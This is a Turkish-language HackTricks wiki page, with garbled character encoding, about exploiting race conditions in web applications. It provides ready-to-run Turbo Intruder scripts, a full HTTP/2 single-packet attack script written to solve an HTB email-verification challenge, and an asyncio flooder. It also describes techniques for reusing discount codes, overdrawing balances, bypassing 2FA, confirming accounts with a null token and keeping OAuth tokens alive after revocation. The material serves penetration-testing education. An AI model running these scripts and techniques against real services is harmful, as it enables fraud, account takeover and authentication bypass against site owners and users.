# Race Condition

<figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
DÃ¼nyanÄ±n **en geliÅŸmiÅŸ** topluluk araÃ§larÄ±yla desteklenen **iÅŸ akÄ±ÅŸlarÄ±nÄ±** kolayca oluÅŸturmak ve **otomatikleÅŸtirmek** iÃ§in [**Trickest**](https://trickest.com/?utm\_source=hacktricks\&utm\_medium=text\&utm\_campaign=ppc\&utm\_term=trickest\&utm\_content=race-condition) kullanÄ±n.\
BugÃ¼n EriÅŸim AlÄ±n:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=race-condition" %}

{% hint style="success" %}
AWS Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter'da** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** bizi takip edin.**
* **Hacking ipuÃ§larÄ±nÄ± paylaÅŸmak iÃ§in** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶nderin.

</details>
{% endhint %}

{% hint style="warning" %}
Bu tekniÄŸi derinlemesine anlamak iÃ§in orijinal raporu [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine) adresinde kontrol edin.
{% endhint %}

## Race Condition SaldÄ±rÄ±larÄ±nÄ± GeliÅŸtirme

Race condition'larÄ± avantaja Ã§evirmenin ana engeli, birden fazla isteÄŸin **iÅŸleme sÃ¼relerinde Ã§ok az farklaâ€”idealde, 1ms'den az**â€”aynÄ± anda iÅŸlenmesini saÄŸlamaktÄ±r.

Ä°stekleri Senkronize Etmek iÃ§in bazÄ± teknikler burada bulunmaktadÄ±r:

#### HTTP/2 Tek-Paket SaldÄ±rÄ±sÄ± vs. HTTP/1.1 Son-Bayt Senkronizasyonu

* **HTTP/2**: Tek bir TCP baÄŸlantÄ±sÄ± Ã¼zerinden iki isteÄŸin gÃ¶nderilmesini destekler, aÄŸ jitter etkisini azaltÄ±r. Ancak, sunucu tarafÄ±ndaki varyasyonlar nedeniyle, iki istek tutarlÄ± bir race condition istismarÄ±na yeterli olmayabilir.
* **HTTP/1.1 'Son-Bayt Senkronizasyonu'**: 20-30 isteÄŸin Ã§oÄŸu kÄ±smÄ±nÄ±n Ã¶nceden gÃ¶nderilmesini saÄŸlar, kÃ¼Ã§Ã¼k bir parÃ§ayÄ± saklayarak, bu parÃ§a daha sonra birlikte gÃ¶nderilir ve sunucuya eÅŸzamanlÄ± varÄ±ÅŸ saÄŸlanÄ±r.

**Son-Bayt Senkronizasyonu iÃ§in HazÄ±rlÄ±k** ÅŸunlarÄ± iÃ§erir:

1. AkÄ±ÅŸÄ± sonlandÄ±rmadan son bayt hariÃ§ baÅŸlÄ±k ve gÃ¶vde verilerini gÃ¶ndermek.
2. Ä°lk gÃ¶nderimden sonra 100ms beklemek.
3. Son Ã§erÃ§eveleri gruplamak iÃ§in Nagle algoritmasÄ±nÄ± kullanmak Ã¼zere TCP\_NODELAY'i devre dÄ±ÅŸÄ± bÄ±rakmak.
4. BaÄŸlantÄ±yÄ± Ä±sÄ±tmak iÃ§in ping atmak.

Saklanan Ã§erÃ§evelerin sonraki gÃ¶nderimi, Wireshark ile doÄŸrulanabilir ÅŸekilde tek bir pakette varÄ±ÅŸ saÄŸlamalÄ±dÄ±r. Bu yÃ¶ntem, genellikle RC saldÄ±rÄ±larÄ±nda yer almayan statik dosyalara uygulanmaz.

### Sunucu Mimarisine Uyum SaÄŸlama

Hedefin mimarisini anlamak Ã§ok Ã¶nemlidir. Ã–n uÃ§ sunucular, istekleri farklÄ± yÃ¶nlendirebilir ve zamanlamayÄ± etkileyebilir. Ã–nleyici sunucu tarafÄ± baÄŸlantÄ± Ä±sÄ±tma, Ã¶nemsiz istekler aracÄ±lÄ±ÄŸÄ±yla istek zamanlamasÄ±nÄ± normalleÅŸtirebilir.

#### Oturum TabanlÄ± Kilitlemeyi YÃ¶netme

PHP'nin oturum yÃ¶neticisi gibi Ã§erÃ§eveler, istekleri oturum bazÄ±nda serileÅŸtirir ve potansiyel olarak zafiyetleri gizleyebilir. Her istek iÃ§in farklÄ± oturum jetonlarÄ± kullanmak bu sorunu aÅŸabilir.

#### HÄ±z veya Kaynak SÄ±nÄ±rlamalarÄ±nÄ± AÅŸma

BaÄŸlantÄ± Ä±sÄ±tma etkili deÄŸilse, web sunucularÄ±nÄ±n hÄ±z veya kaynak limit gecikmelerini kasÄ±tlÄ± olarak bir dizi sahte istekle tetiklemek, sunucu tarafÄ±nda race condition'lara uygun bir gecikme oluÅŸturarak tek paket saldÄ±rÄ±sÄ±nÄ± kolaylaÅŸtÄ±rabilir.

## SaldÄ±rÄ± Ã–rnekleri

* **Tubo Intruder - HTTP2 tek-paket saldÄ±rÄ±sÄ± (1 uÃ§ nokta)**: Ä°steÄŸi **Turbo intruder**'a (`Extensions` -> `Turbo Intruder` -> `Send to Turbo Intruder`) gÃ¶nderebilirsiniz, istekte **`%s`** iÃ§in brute force yapmak istediÄŸiniz deÄŸeri deÄŸiÅŸtirebilirsiniz, Ã¶rneÄŸin `csrf=Bn9VQB8OyefIs3ShR2fPESR0FzzulI1d&username=carlos&password=%s` ve ardÄ±ndan aÃ§Ä±lÄ±r menÃ¼den **`examples/race-single-packer-attack.py`**'yi seÃ§in:

<figure><img src="../.gitbook/assets/image (57).png" alt=""><figcaption></figcaption></figure>

FarklÄ± deÄŸerler **gÃ¶nderecekseniz**, panodan bir kelime listesi kullanan bu kodla kodu deÄŸiÅŸtirebilirsiniz:
```python
passwords = wordlists.clipboard
for password in passwords:
engine.queue(target.req, password, gate='race1')
```
{% hint style="warning" %}
EÄŸer web HTTP2'yi desteklemiyorsa (sadece HTTP1.1) `Engine.BURP2` yerine `Engine.THREADED` veya `Engine.BURP` kullanÄ±n.
{% endhint %}

* **Tubo Intruder - HTTP2 tek paketli saldÄ±rÄ± (BirÃ§ok uÃ§ nokta)**: EÄŸer 1 uÃ§ noktaya bir istek gÃ¶ndermeniz ve ardÄ±ndan RCE'yi tetiklemek iÃ§in diÄŸer uÃ§ noktalara birden fazla istek gÃ¶ndermeniz gerekiyorsa, `race-single-packet-attack.py` scriptini ÅŸu ÅŸekilde deÄŸiÅŸtirebilirsiniz:
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=1,
engine=Engine.BURP2
)

# Hardcode the second request for the RC
confirmationReq = '''POST /confirm?token[]= HTTP/2
Host: 0a9c00370490e77e837419c4005900d0.web-security-academy.net
Cookie: phpsessionid=MpDEOYRvaNT1OAm0OtAsmLZ91iDfISLU
Content-Length: 0

'''

# For each attempt (20 in total) send 50 confirmation requests.
for attempt in range(20):
currentAttempt = str(attempt)
username = 'aUser' + currentAttempt

# queue a single registration request
engine.queue(target.req, username, gate=currentAttempt)

# queue 50 confirmation requests - note that this will probably sent in two separate packets
for i in range(50):
engine.queue(confirmationReq, gate=currentAttempt)

# send all the queued requests for this attempt
engine.openGate(currentAttempt)
```
* AyrÄ±ca **Burp Suite**'teki yeni '**GruplarÄ± paralel gÃ¶nder**' seÃ§eneÄŸi aracÄ±lÄ±ÄŸÄ±yla **Repeater**'da da mevcuttur.
* **Limit-aÅŸÄ±mÄ±** iÃ§in gruba **aynÄ± isteÄŸi 50 kez** ekleyebilirsiniz.
* **BaÄŸlantÄ± Ä±sÄ±nmasÄ±** iÃ§in grubun **baÅŸÄ±na** web sunucusunun bazÄ± statik olmayan kÄ±sÄ±mlarÄ±na **istekler** ekleyebilirsiniz.
* **Bir isteÄŸi iÅŸleme** ile **diÄŸerini** iÅŸleme **arasÄ±nda** sÃ¼reci **geciktirmek** iÃ§in, her iki isteÄŸin arasÄ±na **ekstra istekler** ekleyebilirsiniz.
* **Ã‡oklu uÃ§ nokta** RC iÃ§in, **gizli duruma** giden **isteÄŸi** gÃ¶ndermeye baÅŸlayabilir ve ardÄ±ndan **gizli durumu** istismar eden **50 isteÄŸi** hemen arkasÄ±ndan gÃ¶nderebilirsiniz.

<figure><img src="../.gitbook/assets/image (58).png" alt=""><figcaption></figcaption></figure>

* **Otomatik python scripti**: Bu scriptin amacÄ±, bir kullanÄ±cÄ±nÄ±n e-posta adresini deÄŸiÅŸtirirken sÃ¼rekli olarak doÄŸrulamak ve yeni e-posta adresinin doÄŸrulama token'Ä± son e-posta adresine ulaÅŸana kadar bunu yapmaktÄ±r (bu, kodda bir e-posta adresinin deÄŸiÅŸtirilip doÄŸrulamanÄ±n eski adrese gÃ¶nderilebildiÄŸi bir RC gÃ¶rÃ¼ldÃ¼ÄŸÃ¼ iÃ§indir Ã§Ã¼nkÃ¼ e-posta adresini gÃ¶steren deÄŸiÅŸken zaten ilk e-posta ile doldurulmuÅŸtu).\
"objetivo" kelimesi alÄ±nan e-postalarda bulunduÄŸunda, deÄŸiÅŸtirilmiÅŸ e-posta adresinin doÄŸrulama token'Ä±nÄ± aldÄ±ÄŸÄ±mÄ±zÄ± biliyoruz ve saldÄ±rÄ±yÄ± sonlandÄ±rÄ±yoruz.
```python
# https://portswigger.net/web-security/race-conditions/lab-race-conditions-limit-overrun
# Script from victor to solve a HTB challenge
from h2spacex import H2OnTlsConnection
from time import sleep
from h2spacex import h2_frames
import requests

cookie="session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MiwiZXhwIjoxNzEwMzA0MDY1LCJhbnRpQ1NSRlRva2VuIjoiNDJhMDg4NzItNjEwYS00OTY1LTk1NTMtMjJkN2IzYWExODI3In0.I-N93zbVOGZXV_FQQ8hqDMUrGr05G-6IIZkyPwSiiDg"

# change these headers

headersObjetivo= """accept: */*
content-type: application/x-www-form-urlencoded
Cookie: """+cookie+"""
Content-Length: 112
"""

bodyObjetivo = 'email=objetivo%40apexsurvive.htb&username=estes&fullName=test&antiCSRFToken=42a08872-610a-4965-9553-22d7b3aa1827'

headersVerification= """Content-Length: 1
Cookie: """+cookie+"""
"""
CSRF="42a08872-610a-4965-9553-22d7b3aa1827"

host = "94.237.56.46"
puerto =39697


url = "https://"+host+":"+str(puerto)+"/email/"

response = requests.get(url, verify=False)


while "objetivo" not in response.text:

urlDeleteMails = "https://"+host+":"+str(puerto)+"/email/deleteall/"

responseDeleteMails = requests.get(urlDeleteMails, verify=False)
#print(response.text)
# change this host name to new generated one

Headers = { "Cookie" : cookie, "content-type": "application/x-www-form-urlencoded" }
data="email=test%40email.htb&username=estes&fullName=test&antiCSRFToken="+CSRF
urlReset="https://"+host+":"+str(puerto)+"/challenge/api/profile"
responseReset = requests.post(urlReset, data=data, headers=Headers, verify=False)

print(responseReset.status_code)

h2_conn = H2OnTlsConnection(
hostname=host,
port_number=puerto
)

h2_conn.setup_connection()

try_num = 100

stream_ids_list = h2_conn.generate_stream_ids(number_of_streams=try_num)

all_headers_frames = []  # all headers frame + data frames which have not the last byte
all_data_frames = []  # all data frames which contain the last byte


for i in range(0, try_num):
last_data_frame_with_last_byte=''
if i == try_num/2:
header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(  # noqa: E501
method='POST',
headers_string=headersObjetivo,
scheme='https',
stream_id=stream_ids_list[i],
authority=host,
body=bodyObjetivo,
path='/challenge/api/profile'
)
else:
header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(
method='GET',
headers_string=headersVerification,
scheme='https',
stream_id=stream_ids_list[i],
authority=host,
body=".",
path='/challenge/api/sendVerification'
)

all_headers_frames.append(header_frames_without_last_byte)
all_data_frames.append(last_data_frame_with_last_byte)


# concatenate all headers bytes
temp_headers_bytes = b''
for h in all_headers_frames:
temp_headers_bytes += bytes(h)

# concatenate all data frames which have last byte
temp_data_bytes = b''
for d in all_data_frames:
temp_data_bytes += bytes(d)

h2_conn.send_bytes(temp_headers_bytes)

# wait some time
sleep(0.1)

# send ping frame to warm up connection
h2_conn.send_ping_frame()

# send remaining data frames
h2_conn.send_bytes(temp_data_bytes)

resp = h2_conn.read_response_from_socket(_timeout=3)
frame_parser = h2_frames.FrameParser(h2_connection=h2_conn)
frame_parser.add_frames(resp)
frame_parser.show_response_of_sent_requests()

print('---')

sleep(3)
h2_conn.close_connection()

response = requests.get(url, verify=False)
```
### Tek Paket SaldÄ±rÄ±sÄ±nÄ± GeliÅŸtirme

Orijinal araÅŸtÄ±rmada bu saldÄ±rÄ±nÄ±n 1,500 baytlÄ±k bir sÄ±nÄ±rÄ± olduÄŸu aÃ§Ä±klanmÄ±ÅŸtÄ±r. Ancak, [**bu yazÄ±da**](https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/) tek paket saldÄ±rÄ±sÄ±nÄ±n 1,500 baytlÄ±k sÄ±nÄ±rlamasÄ±nÄ± **IP katmanÄ± parÃ§alama** (tek bir paketi birden fazla IP paketine bÃ¶lme) kullanarak **TCP'nin 65,535 B pencere sÄ±nÄ±rlamasÄ±na** nasÄ±l geniÅŸletilebileceÄŸi aÃ§Ä±klanmÄ±ÅŸtÄ±r ve bunlarÄ±n farklÄ± bir sÄ±rayla gÃ¶nderilmesi, tÃ¼m parÃ§alar sunucuya ulaÅŸana kadar paketin yeniden birleÅŸtirilmesini engellemiÅŸtir. Bu teknik, araÅŸtÄ±rmacÄ±nÄ±n yaklaÅŸÄ±k 166ms iÃ§inde 10,000 istek gÃ¶ndermesine olanak tanÄ±mÄ±ÅŸtÄ±r.&#x20;

Bu iyileÅŸtirmenin, aynÄ± anda yÃ¼zlerce/binlerce paketin ulaÅŸmasÄ±nÄ± gerektiren RC'de saldÄ±rÄ±yÄ± daha gÃ¼venilir hale getirdiÄŸini unutmayÄ±n, ancak bazÄ± yazÄ±lÄ±m sÄ±nÄ±rlamalarÄ± da olabilir. Apache, Nginx ve Go gibi bazÄ± popÃ¼ler HTTP sunucularÄ±, `SETTINGS_MAX_CONCURRENT_STREAMS` ayarÄ±nÄ± sÄ±rasÄ±yla 100, 128 ve 250 olarak belirlemiÅŸtir. Ancak, NodeJS ve nghttp2 gibi diÄŸerleri sÄ±nÄ±rsÄ±zdÄ±r.\
Bu, temelde Apache'nin tek bir TCP baÄŸlantÄ±sÄ±ndan yalnÄ±zca 100 HTTP baÄŸlantÄ±sÄ±nÄ± dikkate alacaÄŸÄ± anlamÄ±na gelir (bu RC saldÄ±rÄ±sÄ±nÄ± sÄ±nÄ±rlayarak).

Bu tekniÄŸi kullanan bazÄ± Ã¶rnekleri [https://github.com/Ry0taK/first-sequence-sync/tree/main](https://github.com/Ry0taK/first-sequence-sync/tree/main) reposunda bulabilirsiniz.

## Ham BF

Ã–nceki araÅŸtÄ±rmadan Ã¶nce, sadece paketleri mÃ¼mkÃ¼n olduÄŸunca hÄ±zlÄ± gÃ¶ndermeye Ã§alÄ±ÅŸan bazÄ± yÃ¼kler kullanÄ±lÄ±yordu.

* **Tekrar Edici:** Ã–nceki bÃ¶lÃ¼mden Ã¶rneklere bakÄ±n.
* **SaldÄ±rgan**: **Ä°steÄŸi** **SaldÄ±rgana** gÃ¶nderin, **SeÃ§enekler menÃ¼sÃ¼nde** **iÅŸ parÃ§acÄ±ÄŸÄ± sayÄ±sÄ±nÄ±** **30** olarak ayarlayÄ±n ve yÃ¼k olarak **Null yÃ¼kleri** seÃ§in ve **30** oluÅŸturun.
* **Turbo SaldÄ±rgan**
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
pipeline=False
)
a = ['Session=<session_id_1>','Session=<session_id_2>','Session=<session_id_3>']
for i in range(len(a)):
engine.queue(target.req,a[i], gate='race1')
# open TCP connections and send partial requests
engine.start(timeout=10)
engine.openGate('race1')
engine.complete(timeout=60)

def handleResponse(req, interesting):
table.add(req)
```
* **Python - asyncio**
```python
import asyncio
import httpx

async def use_code(client):
resp = await client.post(f'http://victim.com', cookies={"session": "asdasdasd"}, data={"code": "123123123"})
return resp.text

async def main():
async with httpx.AsyncClient() as client:
tasks = []
for _ in range(20): #20 times
tasks.append(asyncio.ensure_future(use_code(client)))

# Get responses
results = await asyncio.gather(*tasks, return_exceptions=True)

# Print results
for r in results:
print(r)

# Async2sync sleep
await asyncio.sleep(0.5)
print(results)

asyncio.run(main())
```
## **RC Methodolojisi**

### Limit-aÅŸÄ±mÄ± / TOCTOU

Bu, **hareketi gerÃ§ekleÅŸtirebileceÄŸiniz zaman sayÄ±sÄ±nÄ± sÄ±nÄ±rlayan** yerlerde **gÃ¶rÃ¼nmeye baÅŸlayan** **zayÄ±flÄ±klarÄ±n** bulunduÄŸu en temel yarÄ±ÅŸ durumu tÃ¼rÃ¼dÃ¼r. Ã–rneÄŸin, bir web maÄŸazasÄ±nda aynÄ± indirim kodunu birkaÃ§ kez kullanmak. Ã‡ok basit bir Ã¶rnek [**bu raporda**](https://medium.com/@pravinponnusamy/race-condition-vulnerability-found-in-bug-bounty-program-573260454c43) veya [**bu hatada**](https://hackerone.com/reports/759247)** bulunabilir.**

Bu tÃ¼r saldÄ±rÄ±nÄ±n birÃ§ok varyasyonu vardÄ±r, bunlar arasÄ±nda:

* Bir hediye kartÄ±nÄ± birden fazla kez kullanma
* Bir Ã¼rÃ¼nÃ¼ birden fazla kez deÄŸerlendirme
* Hesap bakiyenizden fazla nakit Ã§ekme veya transfer etme
* Tek bir CAPTCHA Ã§Ã¶zÃ¼mÃ¼nÃ¼ yeniden kullanma
* Bir anti-brute-force hÄ±z limitini aÅŸma

### **Gizli alt durumlar**

KarmaÅŸÄ±k yarÄ±ÅŸ durumlarÄ±nÄ± istismar etmek genellikle gizli veya **istenmeyen makine alt durumlarÄ±yla** etkileÅŸimde bulunmak iÃ§in kÄ±sa fÄ±rsatlarÄ± deÄŸerlendirmeyi iÃ§erir. Ä°ÅŸte buna yaklaÅŸmanÄ±n yolu:

1. **Potansiyel Gizli Alt DurumlarÄ± Belirleyin**
* KullanÄ±cÄ± profilleri veya ÅŸifre sÄ±fÄ±rlama sÃ¼reÃ§leri gibi kritik verileri deÄŸiÅŸtiren veya bunlarla etkileÅŸime giren uÃ§ noktalarÄ± belirleyerek baÅŸlayÄ±n. Åuna odaklanÄ±n:
* **Depolama**: Sunucu tarafÄ±nda kalÄ±cÄ± verileri manipÃ¼le eden uÃ§ noktalarÄ±, istemci tarafÄ±nda veri iÅŸleyenlerden daha fazla tercih edin.
* **Eylem**: Mevcut verileri deÄŸiÅŸtiren iÅŸlemleri arayÄ±n; bunlar yeni veri ekleyenlere gÃ¶re istismar edilebilir koÅŸullar yaratma olasÄ±lÄ±ÄŸÄ± daha yÃ¼ksektir.
* **Anahtar**: BaÅŸarÄ±lÄ± saldÄ±rÄ±lar genellikle aynÄ± tanÄ±mlayÄ±cÄ±ya dayanan iÅŸlemleri iÃ§erir, Ã¶rneÄŸin, kullanÄ±cÄ± adÄ± veya sÄ±fÄ±rlama belirteci.
2. **Ä°lk Kez Test YapÄ±n**
* Belirlenen uÃ§ noktalarÄ± yarÄ±ÅŸ durumu saldÄ±rÄ±larÄ±yla test edin, beklenen sonuÃ§lardan herhangi bir sapma olup olmadÄ±ÄŸÄ±nÄ± gÃ¶zlemleyin. Beklenmedik yanÄ±tlar veya uygulama davranÄ±ÅŸÄ±ndaki deÄŸiÅŸiklikler bir zayÄ±flÄ±ÄŸÄ±n sinyalini verebilir.
3. **ZayÄ±flÄ±ÄŸÄ± GÃ¶sterin**
* ZayÄ±flÄ±ÄŸÄ± istismar etmek iÃ§in gereken en az istek sayÄ±sÄ±nÄ± daraltÄ±n, genellikle sadece iki. Bu adÄ±m, hassas zamanlama gerektirdiÄŸinden birden fazla deneme veya otomasyon gerektirebilir.

### Zaman Hassas SaldÄ±rÄ±lar

Ä°steklerin zamanlamasÄ±ndaki hassasiyet, Ã¶zellikle gÃ¼venlik belirteÃ§leri iÃ§in tahmin edilebilir yÃ¶ntemler (Ã¶rneÄŸin, zaman damgalarÄ±) kullanÄ±ldÄ±ÄŸÄ±nda zayÄ±flÄ±klarÄ± ortaya Ã§Ä±karabilir. Ã–rneÄŸin, zaman damgalarÄ±na dayalÄ± ÅŸifre sÄ±fÄ±rlama belirteÃ§leri oluÅŸturmak, eÅŸzamanlÄ± istekler iÃ§in aynÄ± belirteÃ§lerin oluÅŸmasÄ±na neden olabilir.

**Ä°stismar Etmek Ä°Ã§in:**

* EÅŸzamanlÄ± ÅŸifre sÄ±fÄ±rlama istekleri yapmak iÃ§in tek bir paket saldÄ±rÄ±sÄ± gibi hassas zamanlama kullanÄ±n. AynÄ± belirteÃ§ler bir zayÄ±flÄ±ÄŸÄ±n gÃ¶stergesidir.

**Ã–rnek:**

* AynÄ± anda iki ÅŸifre sÄ±fÄ±rlama belirteci isteyin ve bunlarÄ± karÅŸÄ±laÅŸtÄ±rÄ±n. EÅŸleÅŸen belirteÃ§ler, belirteÃ§ oluÅŸturma sÃ¼recinde bir hatayÄ± iÅŸaret eder.

**Bunu denemek iÃ§in** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-exploiting-time-sensitive-vulnerabilities) **kontrol edin.**

## Gizli alt durumlar vaka Ã§alÄ±ÅŸmalarÄ±

### Ã–deme & Bir ÃœrÃ¼n Ekle

Bunu gÃ¶rmek iÃ§in [**PortSwigger Lab**](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-insufficient-workflow-validation) kontrol edin, nasÄ±l **Ã¶deme** yapacaÄŸÄ±nÄ±zÄ± ve **ekstra** bir Ã¼rÃ¼nÃ¼ **Ã¶demeden ekleyeceÄŸinizi** Ã¶ÄŸrenin.

### DiÄŸer e-postalarÄ± onayla

AmaÃ§, **bir e-posta adresini doÄŸrulamak ve aynÄ± anda farklÄ± birine deÄŸiÅŸtirmek**; bÃ¶ylece platformun yeni deÄŸiÅŸtirilen e-postayÄ± doÄŸrulayÄ±p doÄŸrulamadÄ±ÄŸÄ±nÄ± Ã¶ÄŸrenmektir.

### E-postayÄ± 2 e-posta adresine deÄŸiÅŸtir

[**Bu araÅŸtÄ±rmaya**](https://portswigger.net/research/smashing-the-state-machine) gÃ¶re, Gitlab bu ÅŸekilde bir ele geÃ§irmeye karÅŸÄ± savunmasÄ±zdÄ± Ã§Ã¼nkÃ¼ **bir e-posta iÃ§in e-posta doÄŸrulama belirtecini diÄŸer e-postaya gÃ¶nderebilir**.

**Bunu denemek iÃ§in** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-single-endpoint) **kontrol edin.**

### Gizli VeritabanÄ± durumlarÄ± / Onay Atlama

EÄŸer **2 farklÄ± yazma** iÅŸlemi **veri eklemek** iÃ§in kullanÄ±lÄ±yorsa, veritabanÄ±na **yalnÄ±zca ilk verinin yazÄ±ldÄ±ÄŸÄ±** kÃ¼Ã§Ã¼k bir zaman dilimi vardÄ±r. Ã–rneÄŸin, bir kullanÄ±cÄ± oluÅŸtururken **kullanÄ±cÄ± adÄ±** ve **ÅŸifre** yazÄ±labilir ve ardÄ±ndan yeni oluÅŸturulan hesabÄ± onaylamak iÃ§in **belirteÃ§** yazÄ±labilir. Bu, **bir hesabÄ± onaylamak iÃ§in belirtecin null olduÄŸu** kÃ¼Ã§Ã¼k bir zaman dilimi olduÄŸu anlamÄ±na gelir.

Bu nedenle, **bir hesap kaydetmek ve hemen onaylamak iÃ§in boÅŸ bir belirteÃ§le** (`token=` veya `token[]=` veya baÅŸka bir varyasyon) birkaÃ§ istek gÃ¶ndermek, e-posta kontrolÃ¼nÃ¼z olmayan bir hesabÄ± **onaylamanÄ±za** olanak tanÄ±yabilir.

**Bunu denemek iÃ§in** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-partial-construction) **kontrol edin.**

### 2FA'yÄ± Atlama

AÅŸaÄŸÄ±daki pseudo-kod, Ã§ok kÄ±sa bir sÃ¼re iÃ§inde **2FA'nÄ±n uygulanmadÄ±ÄŸÄ±** iÃ§in yarÄ±ÅŸ durumuna karÅŸÄ± savunmasÄ±zdÄ±r; bu sÃ¼re zarfÄ±nda oturum oluÅŸturulmaktadÄ±r:
```python
session['userid'] = user.userid
if user.mfa_enabled:
session['enforce_mfa'] = True
# generate and send MFA code to user
# redirect browser to MFA code entry form
```
### OAuth2 sonsuz kalÄ±cÄ±lÄ±k

BirÃ§ok [**OAUth saÄŸlayÄ±cÄ±sÄ±**](https://en.wikipedia.org/wiki/List\_of\_OAuth\_providers) bulunmaktadÄ±r. Bu hizmetler, bir uygulama oluÅŸturmanÄ±za ve saÄŸlayÄ±cÄ±nÄ±n kaydettiÄŸi kullanÄ±cÄ±larÄ± kimlik doÄŸrulamanÄ±za olanak tanÄ±r. Bunu yapmak iÃ§in, **istemci** **uygulamanÄ±za** **OAUth saÄŸlayÄ±cÄ±sÄ±** iÃ§indeki bazÄ± verilerine eriÅŸim izni vermelidir.\
Buraya kadar, sadece bir google/linkedin/github... ile giriÅŸ yapma durumu var; karÅŸÄ±nÄ±za "_Uygulama \<InsertCoolName> bilgilerinize eriÅŸmek istiyor, izin vermek ister misiniz?_" diyen bir sayfa Ã§Ä±kÄ±yor.

#### `authorization_code`'da YarÄ±ÅŸ Durumu

**Sorun**, **izin verdiÄŸinizde** ve otomatik olarak kÃ¶tÃ¼ niyetli uygulamaya bir **`authorization_code`** gÃ¶nderdiÄŸinizde ortaya Ã§Ä±kar. ArdÄ±ndan, bu **uygulama, OAUth hizmet saÄŸlayÄ±cÄ±sÄ±ndaki bir YarÄ±ÅŸ Durumunu kÃ¶tÃ¼ye kullanarak hesabÄ±nÄ±z iÃ§in **`authorization_code`**'dan birden fazla AT/RT (_Authentication Token/Refresh Token_) Ã¼retir. Temelde, uygulamanÄ±n verilerinize eriÅŸim izni verdiÄŸinizi kÃ¶tÃ¼ye kullanarak **birden fazla hesap oluÅŸturur**. SonrasÄ±nda, eÄŸer **uygulamanÄ±n verilerinize eriÅŸim iznini durdurursanÄ±z, bir Ã§ift AT/RT silinecek, ancak diÄŸerleri geÃ§erli kalacaktÄ±r**.

#### `Refresh Token`'da YarÄ±ÅŸ Durumu

Bir **geÃ§erli RT** elde ettiÄŸinizde, **birden fazla AT/RT Ã¼retmek iÃ§in bunu kÃ¶tÃ¼ye kullanmayÄ±** deneyebilirsiniz ve **kullanÄ±cÄ± kÃ¶tÃ¼ niyetli uygulamanÄ±n verilerine eriÅŸim izinlerini iptal etse bile**, **birden fazla RT hala geÃ§erli olacaktÄ±r.**

## **WebSockets'te RC**

[**WS\_RaceCondition\_PoC**](https://github.com/redrays-io/WS\_RaceCondition\_PoC) iÃ§inde, **YarÄ±ÅŸ DurumlarÄ±nÄ± Web Sockets'te de kÃ¶tÃ¼ye kullanmak iÃ§in** websocket mesajlarÄ±nÄ± **paralel** olarak gÃ¶nderen bir PoC bulabilirsiniz.

## Referanslar

* [https://hackerone.com/reports/759247](https://hackerone.com/reports/759247)
* [https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html](https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html)
* [https://hackerone.com/reports/55140](https://hackerone.com/reports/55140)
* [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)
* [https://portswigger.net/web-security/race-conditions](https://portswigger.net/web-security/race-conditions)
* [https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/](https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/)

{% hint style="success" %}
AWS Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter**'da **bizi takip edin** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Hacking ipuÃ§larÄ±nÄ± paylaÅŸmak iÃ§in** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶nderin.

</details>
{% endhint %}

